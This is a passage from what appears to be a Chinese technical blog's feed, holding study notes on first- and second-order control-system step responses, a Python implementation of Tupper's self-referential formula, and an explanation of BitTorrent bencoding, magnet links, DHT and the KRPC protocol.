<p><img src="/time-domain-analysis-and-correction/一阶系统的单位阶跃响应.png" alt="一阶系统的单位阶跃响应"> <span class="math display">\[
\begin{cases}
h(0)=0\\
h(\infty)=1\\
h&#39;(0)=\frac{1}{T}\\
h&#39;(t)=\frac{1}{T}e^{-\frac{t}{T}}
\end{cases}
\]</span> 故一阶系统的<strong>调节时间</strong> <span class="math inline">\(t_d\)</span>： <span class="math display">\[
h(t_s)=1-e^{-\frac{t_s}{T}}=0.95
\]</span> 可解得 <span class="math display">\[
t_s=3T
\]</span> 同时可知系统<strong>超调量</strong> <span class="math inline">\(\sigma\%\)</span> 为 0。</p>
<figure>
<img src="/time-domain-analysis-and-correction/一节系统阶跃响应随T的变化趋势.png" alt="一节系统阶跃响应随T的变化趋势">
<figcaption aria-hidden="true">一节系统阶跃响应随T的变化趋势</figcaption>
</figure>
<p>同时我们也知道，<strong>当 <span class="math inline">\(T\)</span>
越大，调节时间越长，到达极点的时间越久</strong>。</p>
<h3 id="一阶系统典型输入响应">一阶系统典型输入响应</h3>
<figure>
<img src="/time-domain-analysis-and-correction/一阶系统典型输入响应.png" alt="一阶系统典型输入响应">
<figcaption aria-hidden="true">一阶系统典型输入响应</figcaption>
</figure>
<h3 id="计算示例">计算示例</h3>
<h4 id="示例一">示例一</h4>
<p>原系统传递函数为 <span class="math display">\[
G(s)=\frac{10}{0.2s+1}
\]</span> 采用下图的反馈方式，欲将反馈系统的调节时间减小为原来的
0.1，并且保证放大倍数不变，试确定参数 <span class="math inline">\(K_0,K_1\)</span>。</p>
<figure>
<img src="/time-domain-analysis-and-correction/反馈系统结构示例图.png" alt="反馈系统结构示例图">
<figcaption aria-hidden="true">反馈系统结构示例图</figcaption>
</figure>
<p>由原系统传递函数可得，</p>
<p>调节时间 <span class="math inline">\(t_s=0.6\)</span>，系统增益 <span class="math inline">\(K=10\)</span>。</p>
<p>改造后的系统调节时间 <span class="math inline">\(t&#39;_s=0.1t_s=0.06=3T&#39;,K&#39;=K=10\)</span>。</p>
<p>可得现反馈系统的传递函数为 <span class="math display">\[
\Phi(s)=\frac{K_0G(s)}{1+K_1G(s)}=\frac{\frac{10K_0}{1+10K_1}}{\frac{0.2}{1+10K_1}s+1}
\]</span> 有 <span class="math display">\[
\begin{cases}
\frac{10K_0}{1+10K_1}=K’=10\\
\frac{0.2}{1+10K_1}=T&#39;=0.02
\end{cases}
\]</span> 解得 <span class="math display">\[
\begin{cases}
K_0=10\\
K_1=0.9
\end{cases}
\]</span></p>
<h4 id="示例二">示例二</h4>
<p>已知单位反馈系统的单位阶跃响应 <span class="math inline">\(h(t)=1-e^{-at}\)</span>，求解系统闭环传递函数
<span class="math inline">\(\Phi(s)\)</span>，单位脉冲响应 <span class="math inline">\(k(t)\)</span>，开环传递函数 <span class="math inline">\(G(s)\)</span>。</p>
<p>我们知道单位脉冲响应就是单位阶跃响应的微分，即 <span class="math display">\[
k(t)=h&#39;(t)=ae^{-at}
\]</span> 而单位脉冲响应拉氏变换后便是系统的传递函数，即 <span class="math display">\[
\Phi(s)=\mathscr{L}[k(t)]=\frac{a}{s+a}
\]</span> 又知道传递函数表达式为 <span class="math display">\[
\Phi(s)=\frac{G(s)}{1+G(s)}
\]</span> 可以得到 <span class="math display">\[
G(s)=\frac{\Phi(s)}{1-\Phi(s)}=\frac{a}{s}
\]</span></p>
<h2 id="二阶系统典型输入响应">二阶系统典型输入响应</h2>
<h3 id="传递函数标准型-1">传递函数标准型</h3>
<p>开环传递函数 <span class="math display">\[
G(s)=\frac{\omega_n^2}{s(s+2\xi\omega_n)}
\]</span> 闭环传递函数 <span class="math display">\[
\begin{align}
\Phi(s)&amp;=\frac{\omega_n^2}{s^2+2\xi\omega_ns+\omega_n^2} &amp;
\text{(首1型)}\\
&amp;=\frac{1}{T^2s^2+2T\xi s+1} &amp; \text{(尾1型)}
\end{align}
\]</span> 我们称，<span class="math inline">\(\xi\)</span>
为<strong>阻尼比</strong>，<span class="math inline">\(\omega_n\)</span>
为<strong>无阻尼自然频率</strong>，且满足 <span class="math display">\[
T=\sqrt{\frac{T_0}{K}}\\
\omega_n=\frac{1}{T}\\
\xi=\frac{1}{2}\sqrt{\frac{1}{KT_0}}
\]</span>
首1标准型传递函数常用于时域分析中；尾1标准型常用于频域分析中。</p>
<p>我们知道，二阶系统闭环特征方程为 <span class="math display">\[
D(s)=s^2+2\xi\omega_ns+\omega_n^2=0
\]</span> 可以计算出不同的特征根 <span class="math inline">\(\lambda\)</span>，按阻尼比 <span class="math inline">\(\xi\)</span> 进行分类，得到</p>
<figure>
<img src="/time-domain-analysis-and-correction/二阶系统按阻尼比分类表.png" alt="二阶系统按阻尼比分类表">
<figcaption aria-hidden="true">二阶系统按阻尼比分类表</figcaption>
</figure>
<h3 id="过阻尼动态性能指标计算">过阻尼动态性能指标计算</h3>
<p>计算 <span class="math inline">\(D(s)=0\)</span> 得到 <span class="math display">\[
\lambda_1=-\frac{1}{T_1}=-(\xi-\sqrt{\xi^2-1})\omega_n\\
\lambda_2=-\frac{1}{T_2}=-(\xi+\sqrt{\xi^2-1})\omega_n\\
(T_1&gt;T_2)
\]</span> 那么得到单位阶跃响应为 <span class="math display">\[
C(s)=\Phi(s)R(s)=\frac{\omega_n^2}{(s+1/T_1)(s+1/T_2)}\frac{1}{s}
\]</span> 拉氏反变换得到 <span class="math display">\[
h(t)=1+\frac{e^{-\frac{t}{T_1}}}{\frac{T_2}{T_1}-1}+\frac{e^{-\frac{t}{T_2}}}{\frac{T_1}{T_2}-1}
\]</span> 求解调节时间，即 <span class="math display">\[
h(t_s)=1+\frac{1}{\frac{T_2}{T_1}-1}e^{-\frac{t_s}{T_1}}+\frac{1}{\frac{T_1}{T_2}-1}e^{-\frac{T_1}{T_2}\frac{t_s}{T_1}}=0.95
\]</span> 我们可以计算得到 <span class="math display">\[
\xi=\frac{1+T_1/T_2}{2\sqrt{T_1/T_2}}
\]</span> 根据 <span class="math inline">\(h(t_s)\)</span> 绘制 <span class="math inline">\(t_s/T_1-T_1/T_2\)</span> 图</p>
<figure>
<img src="/time-domain-analysis-and-correction/欠阻尼t_s图解.png" alt="欠阻尼t_s图解">
<figcaption aria-hidden="true">欠阻尼t_s图解</figcaption>
</figure>
<p>根据图，我们便可求出 <span class="math inline">\(t_s\)</span>。</p>
<h3 id="计算示例-1">计算示例</h3>
<h4 id="示例一-1">示例一</h4>
<p>已知闭环传递函数 <span class="math display">\[
\Phi(s)=\frac{16}{s^2+10s+16}
\]</span> 计算系统动态性能指标。</p>
<p>由系统闭环传递函数可得， <span class="math display">\[
\Phi(s)=\frac{16}{(s+2)(s+8)}\\
\omega_n=\sqrt{16}=4\\
T_1=\frac{1}{2}\\
T_2=\frac{1}{8}\\
T_1/T_2=4\\
\xi=\frac{1+4}{2\times\sqrt{4}}=1.25&gt;1\\
\]</span> 由图可知，<span class="math inline">\(t_s/T_1=3.3\)</span>，故
<span class="math display">\[
t_s=3.3T_1=1.65\ \mathrm{s}
\]</span></p>
<h3 id="临界阻尼性能指标计算">临界阻尼性能指标计算</h3>
<p>当 <span class="math inline">\(\xi=1\)</span>
时，系统处于<strong>临界阻尼状态</strong>，此时闭环极点是一对相等实根，即
<span class="math display">\[
\lambda_1=\lambda_2=-\omega_n=-1/T_1
\]</span> 其中，单位阶跃响应为 <span class="math display">\[
C(s)=\Phi(s)R(s)=\frac{\omega_n^2}{(s+\omega_n)^2}\frac{1}{s}
\]</span> 故时域下 <span class="math display">\[
h(t)=1-(1+\omega_nt)e^{-\omega_nt}
\]</span> 可以求解得到调节时间 <span class="math inline">\(t_s=4.75T_1\)</span>。</p>
<h3 id="欠阻尼性能指标计算">欠阻尼性能指标计算</h3>
<p>欠阻尼系统的极点可以用两种形式表示。</p>
<ol type="1">
<li><p>直角坐标表示 <span class="math display">\[
\lambda=\sigma\pm\mathrm{j}\omega_d=-\xi\omega_n\pm\mathrm{j}\sqrt{1-\xi^2}\omega_n
\]</span></p></li>
<li><p>极坐标表示 <span class="math display">\[
\begin{cases}
|\lambda|=\omega_n\\
\angle \lambda=\beta
\end{cases},
\begin{cases}
\cos\beta=\xi\\
\sin\beta=\sqrt{1-\xi^2}
\end{cases}
\]</span></p></li>
</ol>
<figure>
<img src="/time-domain-analysis-and-correction/欠阻尼系统极点表示.png" alt="欠阻尼系统极点表示">
<figcaption aria-hidden="true">欠阻尼系统极点表示</figcaption>
</figure>
<p>单位阶跃响应可得 <span class="math display">\[
h(t)=1-\frac{e^{-\xi\omega_nt}}{\sqrt{1-\xi^2}}\sin(\sqrt{1-\xi^2}\omega_nt+\beta)
\]</span> 其曲线被上下包络线 <span class="math inline">\(1+\frac{e^{-\xi\omega_nt}}{\sqrt{1-\xi^2}}\)</span>
和 <span class="math inline">\(1-\frac{e^{-\xi\omega_nt}}{\sqrt{1-\xi^2}}\)</span>
包络。</p>
<p>计算调节时间变为计算上下包络线进入 <span class="math inline">\(5\%\)</span> 误差带的时间 <span class="math display">\[
\left|1-(1-\frac{e^{-\xi\omega_nt}}{\sqrt{1-\xi^2}})\right|=\frac{e^{-\xi\omega_nt}}{\sqrt{1-\xi^2}}=0.05
\]</span> 计算可得 <span class="math display">\[
t_s=\frac{3.5}{\xi\omega_n}
\]</span></p>
<blockquote>
<p>当 <span class="math inline">\(0.3&lt;\xi&lt;0.8\)</span>
时才可用。</p>
</blockquote>
<p>当 <span class="math inline">\(\xi=0.707(\beta=45\degree)\)</span>
时，<span class="math inline">\(t_s\approx2T\)</span>，故被称作最佳阻尼比。</p>
<p>峰值时间 <span class="math display">\[
t_p=\frac{\pi}{\sqrt{1-\xi^2}\omega_n}
\]</span> 超调量 <span class="math display">\[
\sigma\%=e^{-\xi\pi/\sqrt{1-\xi^2}}\times100\%
\]</span> <img src="/time-domain-analysis-and-correction/欠阻尼二阶系统超调量与阻尼比的关系曲线.png" alt="欠阻尼二阶系统超调量与阻尼比的关系曲线"></p>
]]></content>
      <tags>
        <tag>自动控制原理</tag>
      </tags>
  </entry>
  <entry>
    <title>tupper公式（塔珀自指公式）</title>
    <url>//tupper-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Tupper 的自引用公式是由 Jeff Tupper
定义的公式，当在平面中非常特定的位置以二维图形绘制时，可以直观地再现公式本身。</p>
<blockquote>
<p>实际上，它再现了所有可能的 106 像素宽和 17 像素高的图像。</p>
</blockquote>
<p>该公式是由以下定义的不等式：</p>
<p><span class="math display">\[
\frac{1}{2}&lt;\left\lfloor\mathrm{mod}\left(\left\lfloor\frac{y}{17}\right\rfloor
2^{-17\lfloor x\rfloor-\mathrm{mod}(\lfloor
y\rfloor,17))},2\right)\right\rfloor
\]</span> 对于不同的 <span class="math inline">\(k\)</span>
值，可以求得不同的图像，而当 <span class="math inline">\(k\)</span>
为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300</span><br></pre></td></tr></table></figure>
<p>将得到与自身表达式完全一样的图像，故被称作自引用（自指）公式。</p>
<figure>
<img src="/tupper-note/自指公式图像.png" alt="自指公式图像">
<figcaption aria-hidden="true">自指公式图像</figcaption>
</figure>
<p>可以使用在线网站绘制图像：<a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p>
<h1 id="python实现">Python实现</h1>
<p>与原公式不相同，做了一些修正</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Literal</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tupper_self_referential_formula</span>(<span class="params">k: <span class="built_in">int</span>, width: <span class="built_in">int</span> = <span class="number">17</span>, height: <span class="built_in">int</span> = <span class="number">106</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Tupper self referential formula函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        k - 用于迭代图像的k值</span></span><br><span class="line"><span class="string">        width - 图像的宽</span></span><br><span class="line"><span class="string">        height - 图像的高</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        类型是numpy.ndarray矩阵，里面只有0和1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">    rst = np.zeros((width, height))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        y += k</span><br><span class="line">        a1 = <span class="number">2</span> ** (width * x + y % width)</span><br><span class="line">        a2 = (y // width) // a1</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> (a2 &amp; <span class="number">1</span>) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            rst[y, x] = f(x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rst[:, ::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tupper_to_str</span>(<span class="params">k: <span class="built_in">int</span>, width: <span class="built_in">int</span> = <span class="number">17</span>, height: <span class="built_in">int</span> = <span class="number">106</span>, show_black: <span class="built_in">str</span> = <span class="string">&quot;■&quot;</span>, show_white: <span class="built_in">str</span> = <span class="string">&quot;□&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成Tupper self referential formula函数的字符画</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        k - 用于迭代图像的k值</span></span><br><span class="line"><span class="string">        width - 图像的宽</span></span><br><span class="line"><span class="string">        height - 图像的高</span></span><br><span class="line"><span class="string">        show_black - 字符画中的黑色方块</span></span><br><span class="line"><span class="string">        show_white - 字符画中的白色方块</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        字符画字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mat = tupper_self_referential_formula(k, width, height)</span><br><span class="line">    rst = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">if</span> mat[y, x] == <span class="number">1</span>:</span><br><span class="line">                rst += show_black</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rst += show_white</span><br><span class="line">        rst += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tupper_to_img</span>(<span class="params">k: <span class="built_in">int</span>, width: <span class="built_in">int</span> = <span class="number">17</span>, height: <span class="built_in">int</span> = <span class="number">106</span>, filename: <span class="built_in">str</span> = <span class="string">&#x27;tupper.png&#x27;</span>, origin: <span class="type">Literal</span>[<span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>] = <span class="string">&#x27;upper&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成Tupper self referential formula函数的字符画</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        k - 用于迭代图像的k值</span></span><br><span class="line"><span class="string">        width - 图像的宽</span></span><br><span class="line"><span class="string">        height - 图像的高</span></span><br><span class="line"><span class="string">        filename - 输出图像的文件名</span></span><br><span class="line"><span class="string">        origin - 输出图像的方式(upper或者lower)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        类型是numpy.ndarray矩阵，里面只有0和1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">    rst = tupper_self_referential_formula(k, width, height)</span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>, <span class="number">10</span>))</span><br><span class="line">    plt.imshow(rst, origin=origin)</span><br><span class="line">    plt.savefig(filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="number">92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058</span></span><br><span class="line"></span><br><span class="line">rst = tupper_to_str(k, <span class="number">22</span>, <span class="number">160</span>)</span><br><span class="line"><span class="built_in">print</span>(rst)</span><br><span class="line">tupper_to_img(k, <span class="number">22</span>, <span class="number">160</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>torrent笔记</title>
    <url>//torrent-note.html</url>
    <content><![CDATA[<h1 id="前文">前文</h1>
<p>要理解下面的内容之前，首先要知道什么是 BitTorrent</p>
<p>BitTorrent 是一种点对点（P2P, Peers to
Peers）的通信协议，用于在互联网上分发大量的数据和电子文件，包括但不限于数字视频文件或者歌曲文件。</p>
<p>而点对点（P2P, Peers to Peers）网络是指仅两台或多台 PC
连接并共享资源而无需通过单独的服务器的用户网络。</p>
<p>BitTorrent 协议可用于减少分发大文件对服务器和网络的影响。BitTorrent
协议不是从单个源服务器下载文件，而是允许用户加入主机“群”（一群人下载和上传相同的文件），以同时从彼此下载和上传。</p>
<p>使用 BitTorrent
协议，几台基本计算机（例如家用计算机）可以取代大型服务器，同时有效地将文件分发给许多收件人。这种较低的带宽使用量还有助于防止给定区域的互联网流量大幅飙升，从而为所有用户保持更高的互联网速度，无论他们是否使用
BitTorrent 协议。</p>
<h1 id="bencoding-编码">Bencoding 编码</h1>
<p>Bencoding 编码在 BitTorrent 协议中非常常见，更重要的是，BT
种子文件本身就是一个该编码的字典。</p>
<p>Bencoding 编码是一种非常简洁的数据格式，共支持 4 种不同的类型：</p>
<ol type="1">
<li><p>字符串</p>
<p>格式为 <code>&lt;字符串长度&gt;:&lt;字符串&gt;</code>，例如
<code>4:qsdz</code> 代表字符串 <code>qsdz</code></p></li>
<li><p>整型</p>
<p>格式为 <code>i&lt;值&gt;e</code>，例如 <code>i10086e</code> 代表整型
<code>10086</code></p></li>
<li><p>列表</p>
<p>格式为 <code>l[data1][data2][...]e</code>，例如
<code>l4:qsdz4:yydsi666ee</code> 可以拆分看作
<code>l[4:qsdz][4:yyds][i666e]e</code>，即表示列表
<code>[qsdz, yyds, 666]</code></p></li>
<li><p>字典</p>
<p>格式为 <code>d[key1][value2][...]e</code>，例如
<code>d4:qsdzi666e4:yyds2:mee</code> 可以拆分看作
<code>d[4:qsdz][i666e][4:yyds][2:me]e</code>，即表示字典
<code>&#123;qsdz:666, yyds:me&#125;</code></p>
<p>但是需要注意的是，字典的 key
必须是字符串，并且需按照字母顺序排序。</p></li>
</ol>
<h1 id="seeds-peers-leechers">Seeds &amp; Peers &amp; Leechers</h1>
<p><strong>Seed </strong>是一个在其客户端中打开 torrent
文件的人（假设你正在尝试下载相同的文件），你和他们之间的唯一区别是他们已经下载了完整的文件并且现在正在<strong>播种</strong>，即正在<strong>共享</strong>给
<strong>Peers</strong> 文件，但不从其他人那里下载文件的任何部分。</p>
<p><strong>Leecher</strong>
是那些同时进行下载和上传的人。如果用户开始共享他已经拥有的文件，并下载其他用户已经上传或正在上传
torrent 文件的文件，他就成为了
<strong>Leecher</strong>。显而易见，<strong>Leechers</strong>
倾向于下载他们所没有的资源，共享他们已有的资源。</p>
<p>理论上来说，<strong>播种</strong>的人越多，对种子文件的下载速度就会越快。当
<strong>Leechers</strong>
的文件下载完成，并且他们仍然没有从上传中删除该文件时，他们就会成为
<strong>Seeds</strong>。</p>
<figure>
<img src="/torrent-note/关系图.png" alt="关系图">
<figcaption aria-hidden="true">关系图</figcaption>
</figure>
<p>在上图中，中间的电脑即是 <strong>Seed</strong>，而其他的电脑是
<strong>Peers</strong>。</p>
<p><strong>Peer</strong>
是在种子网络中同时下载和上传文件的人。文件是分块下载的，当一个用户下载了一些文件块后，他就会自动开始上传它。</p>
<p>如果更多的人参与到种子网络中，文件的下载速度就会更快。当一个节点下载完毕并希望继续上传时，他就变成了
<strong>Seed</strong>。</p>
<h1 id="种子文件与磁力链接">种子文件与磁力链接</h1>
<p>在很早的网络时代，下载都是简单的集中式客户端/服务器模式，一个或多个服务器支撑成千上万的客户端连接下载，不仅带宽遇到了瓶颈，而且太容易出现单点故障。这时
P2P 被提出来解决这个问题，通过分布式提高网络资源的利用率。但是 P2P
只是一个理念，真正将这个理念贯彻的还是 BitTorrent 协议。</p>
<p>在 BitTorrent （简称
BT）中，所有的资源被切成很小的一份文件块（<strong>pieces</strong>），在这个基础上，BitTorrent
网络中的所有具有相同请求的用户可以相互传资源碎片，并且谁传得越多谁就能获得越多。</p>
<p>而种子文件，就是拥有完整资源的人，根据 BitTorrent
协议，生成的一个包含 Tracker 信息和文件信息的文本文件。</p>
<p>Tracker 信息主要是BT下载中需要用到的 Tracker 服务器的地址和针对
Tracker 服务器的设置，文件信息是根据对目标文件的计算生成的，计算结果根据
BitTorrent 协议内的 Bencode
规则进行编码。它的主要原理是需要把提供下载的文件虚拟分成大小相等的块，块大小必须为2k的整数次方（由于是虚拟分块，硬盘上并不产生各个块文件），并把每个块的索引信息和
Hash
验证码写入种子文件中；所以，种子文件就是被下载文件的<strong>索引</strong>。</p>
<p>下载者要下载文件内容，需要先得到相应的种子文件，然后使用 BT
客户端软件进行下载。 下载时，BT 客户端首先解析种子文件得到 Tracker
地址，然后连接 Tracker 服务器。Tracker
服务器回应下载者的请求，提供下载者其他下载者（包括发布者）的 IP。</p>
<p>下载者再连接其他下载者，根据种子文件，两者分别告知对方自己已经有的块，然后交换对方所没有的数据。此时不需要其他服务器参与，分散了单个线路上的数据流量，因此减轻了服务器负担。
下载者每得到一个块，需要算出下载块的 Hash
验证码与种子文件中的对比，如果一样则说明块正确，不一样则需要重新下载这个块。</p>
<p>与此同时，当拥有完整文件的用户越多，种子的寿命也就越长。</p>
<p>综上所述，可以看出 Tracker
服务器在BT网络中充当着非常重要的作用，和传统的客户端/服务器模式一样，Tracker
服务器同样会存在单点故障问题。所以在BT技术的基础上，后来又衍生出 DHT
网络和磁力链接技术，DHT 全称为分布式哈希表（Distributed Hash
Table），是一种分布式存储方法。</p>
<p>DHT 网络是 Tracker-less 的，不依赖于其他的 Tracker
服务器。在这种情况下，每个客户端负责一个小范围的路由，并负责存储一小部分数据，从而实现整个
DHT
网络的寻址和存储。使用支持该技术的BT下载软件，用户无需连上Tracker就可以下载，因为软件会在
DHT 网络中寻找下载同一文件的其他用户并与之通讯，开始下载任务。</p>
<p>在网络中定位资源最简单的方法是URL（统一资源定位符），它是通过资源的位置来进行定位。而在DHT网络中，则是使用URN（统一资源名称）来进行定位，磁力链接就是基于文件内容的散列函数值来链接到特定文件，生成一个唯一的文件识别符，从而在DHT网络中定位并下载文件。</p>
<p>磁力链接格式如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magnet:?xt=urn:btih:e2467cbf021192c241367b892230dc1e05c0580e</span><br></pre></td></tr></table></figure>
<p>其中 <code>urn</code> 为统一资源名称，<code>bith</code> 是
<strong>BitTorrent Info Hash</strong> 的缩写，是 BitTorrent 使用的 Hash
函数。</p>
<p>实际上除了 <code>bith</code> 还可以是其他类型的 Hash
函数，但主流仍然是 <code>bith</code>。</p>
<p>通过这一串字符串，BT 工具就可以在 DHT 网络中定位下载文件。</p>
<p>根据以上我们可以得知，种子的稳定性高，信息多，但不便于传播扩散；而磁力链接不稳定，可能在某时刻不能获取，但是很便于扩散。</p>
<h1 id="dht-网络">DHT 网络</h1>
<p>磁力链接的发明使得 P2P 客户端直接从 DHT
网络中寻找资源，而不是传统的依赖于 Tracker 服务器，这样就避免了 Tracker
服务器的单点故障问题，所以从 DHT 中获取的种子有时候也叫做
<code>Trackerless torrent</code>。DHT
网络是一种分布式的去中心化网络，每个加入 DHT
网络的节点都要负责存储这个网络中的资源和其他成员的联系信息。</p>
<p>DHT
网络很像是六人定律，它通过用户与用户之间的联系和转移，最终得到我们的目标。</p>
<p>如果一个新节点要加入到 DHT
网络中，它必须要先认识一个人带你进去。这样的人我们把他叫做
<code>bootstrap node</code>，常见的 <code>bootstrap node</code>
有：<code>router.bittorrent.com</code>、<code>router.utorrent.com</code>、<code>router.bitcomet.com</code>、<code>dht.transmissionbt.com</code>
等等。</p>
<p>所以在一个 torrent 流量中，我们经常能看到一开始会有 DNS
请求。例如下图</p>
<figure>
<img src="/torrent-note/bootstrap%20node.png" alt="bootstrap node">
<figcaption aria-hidden="true">bootstrap node</figcaption>
</figure>
<h1 id="krpc-协议">KRPC 协议</h1>
<p>DHT 建立在 UDP 之上，想要获取需要的 Peers 信息，首先要了解下
<code>Kademlia</code> 的 <code>KRPC</code> 协议。 关于路由表和 Kademlia
的介绍，可以参照官方文档。我们这里的重点在于如何根据磁力链接获取拥有该磁力链接对应的种子文件信息的
Peers，所以只需要了解 <code>KRPC</code> 协议。 <code>KRPC</code>
协议是由 Bencoding 编码组成的一个简单的 RPC
结构，有4种请求：<code>ping</code>、<code>find_node</code>、<code>get_peers</code>
和 <code>announce_peer</code>。</p>
<ul>
<li><code>ping</code> → 检测节点是否可达，请求包含一个参数
<code>id</code>，代表该节点的 id。对应的回复也应该包含回复者的id。</li>
<li><code>find_node</code> → 该请求包含两个参数 <code>id</code> 和
<code>target</code>，<code>id</code> 为该节点的 id，<code>target</code>
为要查询的 id。回复中应该包含被请求节点的路由表中距离
<code>target</code> 最接近的 8 个 id。</li>
<li><code>get_peers</code> → 该请求包含两个参数 <code>id</code> 和
<code>infohash</code>，<code>id</code> 为该节点的
id，<code>info_hash</code> 为种子文件的SHA1哈希值，也就是磁力链接的
<code>btih</code> 值。如果被请求的节点有对应 <code>info_hash</code> 的
<strong>peers</strong>，他将返回一个关键字
<code>values</code>，这是一个列表类型的字符串。每一个字符串包含了
<code>CompactIP-address/portinfo</code>
格式的peers信息。如果被请求的节点没有这个 <code>infohash</code> 的
<strong>peers</strong>，那么他将返回关键字
<code>nodes</code>，这个关键字包含了被请求节点的路由表中离
<code>info_hash</code> 最近的 K 个 <strong>nodes</strong>，使用
<code>Compactnodeinfo</code> 格式回复。</li>
<li><code>announce_peer</code> → 如果节点正在下载 torrent
文件，则需要通知其他人你正在哪个端口进行下载，这样就可以分享给其他人，让其他人连接你进行下载。</li>
</ul>
<p>在 WireShark 中，可以查看 <code>BT-DHT</code> 协议查看这些请求：</p>
<ul>
<li><p><code>ping</code></p>
<figure>
<img src="/torrent-note/ping%20request.png" alt="ping request">
<figcaption aria-hidden="true">ping request</figcaption>
</figure></li>
<li><p><code>find_node</code></p>
<figure>
<img src="/torrent-note/find_node%20request.png" alt="find_node request">
<figcaption aria-hidden="true">find_node request</figcaption>
</figure></li>
<li><p><code>get_peers</code></p>
<figure>
<img src="/torrent-note/get_peers%20request.png" alt="get_peers request">
<figcaption aria-hidden="true">get_peers request</figcaption>
</figure></li>
<li><p><code>announce_peer</code></p>
<figure>
<img src="/torrent-note/announce_peer%20request.png" alt="announce_peer request">
<figcaption aria-hidden="true">announce_peer request</figcaption>
</figure></li>
</ul>
<h1 id="种子文件格式">种子文件格式</h1>
<p>BT种子文件整个是一个 Bencoding 编码字典格式，比较重要的
<code>key</code> 有：</p>
<ul>
<li><code>announce</code> → tracker 服务器的地址</li>
<li><code>announce-list</code> → 可选的 tracker 服务器地址</li>
<li><code>creation date</code> → 文件创建时间</li>
<li><code>created by</code> → 文件创建者</li>
<li><code>info</code> → BT 种子文件的文件信息</li>
</ul>
<p>而 <code>info</code> 的 <code>value</code>
会根据种子包含的是单文件还是多文件有所区别，以下是公共部分：</p>
<ul>
<li><code>piece length</code> → 每一数据块的长度</li>
<li><code>pieces</code> → 所有数据块的 SHA1 校验值</li>
</ul>
<p>如果种子包含的是单文件，则还有以下 <code>key</code></p>
<ul>
<li><code>name</code> → 文件名称</li>
<li><code>length</code> → 文件的长度</li>
</ul>
<p>如果包含的是多文件，则是以下 <code>key</code></p>
<ul>
<li><code>name</code> → 文件夹名称</li>
